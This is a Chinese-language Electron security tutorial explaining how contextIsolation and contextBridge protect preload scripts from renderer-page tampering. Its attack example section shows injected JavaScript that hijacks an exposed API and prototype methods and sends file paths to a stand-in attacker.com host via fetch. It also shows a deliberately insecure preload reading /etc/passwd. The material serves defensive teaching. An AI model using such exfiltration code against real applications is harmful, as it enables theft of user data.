---
title: contextIsolation 的作用是什么？
category: Electron
difficulty: 中级
updatedAt: 2025-12-11
summary: >-
  理解 contextIsolation 如何隔离 preload 脚本和渲染进程的 JavaScript 上下文，防止原型链污染攻击。
tags:
  - Electron
  - 安全
  - contextIsolation
  - 上下文隔离
estimatedTime: 10 分钟
keywords:
  - contextIsolation
  - 上下文隔离
  - 原型链污染
highlight: contextIsolation 通过隔离 JavaScript 上下文，防止渲染进程篡改 preload 暴露的 API
order: 75
---

## 问题 1：contextIsolation 是什么？

`contextIsolation` 是一个安全特性，它将 preload 脚本的 JavaScript 上下文与渲染进程页面的上下文完全隔离：

```javascript
new BrowserWindow({
  webPreferences: {
    contextIsolation: true, // 默认开启
    preload: path.join(__dirname, "preload.js"),
  },
});
```

### 隔离效果

```
┌─────────────────────────────────────────────────┐
│              渲染进程                            │
│  ┌───────────────────┐  ┌───────────────────┐  │
│  │  Preload 上下文    │  │   页面上下文       │  │
│  │                   │  │                   │  │
│  │  - require()      │  │  - window         │  │
│  │  - Node.js API    │  │  - document       │  │
│  │  - ipcRenderer    │  │  - 页面脚本        │  │
│  │                   │  │                   │  │
│  │  独立的原型链      │  │  独立的原型链      │  │
│  └───────────────────┘  └───────────────────┘  │
│           │                      │             │
│           └──── contextBridge ───┘             │
│                (安全的桥接)                      │
└─────────────────────────────────────────────────┘
```

---

## 问题 2：为什么需要上下文隔离？

### 没有隔离时的风险：原型链污染

```javascript
// contextIsolation: false 时的风险

// preload.js
window.myAPI = {
  readFile: (path) => require("fs").readFileSync(path, "utf-8"),
};

// 恶意页面脚本可以污染原型链
Array.prototype.join = function () {
  // 窃取所有经过 join 的数据
  sendToAttacker(this);
  return originalJoin.apply(this, arguments);
};

Object.prototype.toString = function () {
  // 篡改所有对象的行为
};

// 当 preload 的代码使用这些被污染的方法时
// 攻击者就能拦截或篡改数据
```

### 开启隔离后

```javascript
// contextIsolation: true

// preload.js 运行在独立的上下文中
// 有自己的 Array.prototype, Object.prototype 等
// 页面脚本的污染不会影响 preload

// 页面脚本
Array.prototype.join = maliciousFunction; // 只影响页面上下文

// preload 中的 Array.prototype.join 不受影响
```

---

## 问题 3：如何在隔离的上下文间通信？

使用 `contextBridge` 安全地暴露 API：

```javascript
// preload.js
const { contextBridge, ipcRenderer } = require("electron");

// contextBridge 会安全地复制数据，而不是共享引用
contextBridge.exposeInMainWorld("electronAPI", {
  // 函数会被包装，参数和返回值会被安全复制
  getData: () => ipcRenderer.invoke("get-data"),

  // 原始值会被复制
  version: process.versions.electron,

  // 对象会被深拷贝
  config: { theme: "dark", language: "zh" },
});

// renderer.js (页面脚本)
// 可以安全地使用暴露的 API
const data = await window.electronAPI.getData();
console.log(window.electronAPI.version);
```

### contextBridge 的安全机制

```javascript
// contextBridge 做了什么：

// 1. 参数序列化
// 页面传入的参数会被序列化后再传给 preload
// 防止传入恶意对象

// 2. 返回值复制
// preload 返回的数据会被复制到页面上下文
// 防止页面获取 preload 上下文的引用

// 3. 函数包装
// 暴露的函数会被包装，确保在正确的上下文中执行
```

---

## 问题 4：关闭 contextIsolation 会怎样？

```javascript
// ⚠️ 不推荐
new BrowserWindow({
  webPreferences: {
    contextIsolation: false,
    preload: path.join(__dirname, "preload.js"),
  },
});

// preload.js
// 直接挂载到 window 上
window.myAPI = {
  dangerous: () => require("fs").readFileSync("/etc/passwd"),
};

// 页面脚本可以：
// 1. 直接访问 window.myAPI
// 2. 修改 window.myAPI 的行为
// 3. 污染原型链影响 preload 的执行
```

### 实际攻击示例

```javascript
// 攻击者通过 XSS 注入以下代码

// 1. 劫持 API 调用
const originalReadFile = window.myAPI.readFile;
window.myAPI.readFile = function (path) {
  // 窃取所有读取的文件路径
  fetch("https://attacker.com/log?path=" + path);
  return originalReadFile(path);
};

// 2. 原型链污染
Object.defineProperty(Object.prototype, "then", {
  get() {
    // 劫持所有 Promise
    return (resolve) => {
      fetch("https://attacker.com/steal");
      resolve(this);
    };
  },
});
```

---

## 问题 5：contextIsolation 的最佳实践

### 始终开启

```javascript
// 推荐配置
new BrowserWindow({
  webPreferences: {
    contextIsolation: true, // 必须开启
    nodeIntegration: false,
    sandbox: true,
    preload: path.join(__dirname, "preload.js"),
  },
});
```

### 最小化暴露的 API

```javascript
// preload.js
contextBridge.exposeInMainWorld("api", {
  // ✅ 只暴露必要的功能
  saveDocument: (content) => ipcRenderer.invoke("save-doc", content),

  // ❌ 不要暴露通用能力
  // ipcRenderer: ipcRenderer,  // 危险！
  // require: require,          // 危险！
});
```

### 验证所有输入

```javascript
// preload.js
contextBridge.exposeInMainWorld("api", {
  readFile: (filename) => {
    // 验证文件名，防止路径遍历
    if (filename.includes("..") || filename.startsWith("/")) {
      throw new Error("Invalid filename");
    }
    return ipcRenderer.invoke("read-file", filename);
  },
});
```

## 延伸阅读

- [Context Isolation 官方文档](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [contextBridge API](https://www.electronjs.org/docs/latest/api/context-bridge)
- [原型链污染攻击](https://portswigger.net/web-security/prototype-pollution)
